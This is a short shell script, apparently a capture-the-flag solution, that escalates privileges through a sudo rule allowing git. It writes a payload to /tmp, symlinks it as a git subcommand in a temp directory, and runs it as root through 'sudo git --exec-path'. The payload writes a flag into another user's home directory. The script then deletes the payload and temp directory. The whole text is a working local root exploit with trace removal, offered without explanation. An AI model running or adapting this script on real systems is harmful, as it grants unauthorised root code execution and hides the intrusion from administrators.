#!/bin/sh

echo "#!/bin/bash" > /tmp/payload
echo "echo 'flag' > /home/marcio/edival" >> /tmp/payload

chmod 755 /tmp/payload

TF=$(mktemp -d)
ln -s /tmp/payload "$TF/git-x"
sudo git "--exec-path=$TF" x

rm -rf /tmp/payload
rm -fr $TF
